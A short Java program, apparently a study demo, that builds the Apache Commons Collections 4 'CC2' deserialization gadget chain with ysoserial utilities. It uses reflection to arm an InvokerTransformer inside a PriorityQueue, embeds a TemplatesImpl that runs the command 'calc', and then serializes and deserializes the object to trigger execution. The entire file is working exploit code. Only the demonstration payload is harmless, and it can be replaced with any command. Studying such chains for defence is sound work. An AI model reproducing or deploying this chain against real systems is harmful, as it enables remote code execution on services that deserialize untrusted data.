package org.chabug.demo;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.chabug.util.Serializables;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("calc");
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;


        byte[] bytes = Serializables.serializeToBytes(queue);
        Serializables.deserializeFromBytes(bytes);
    }
}
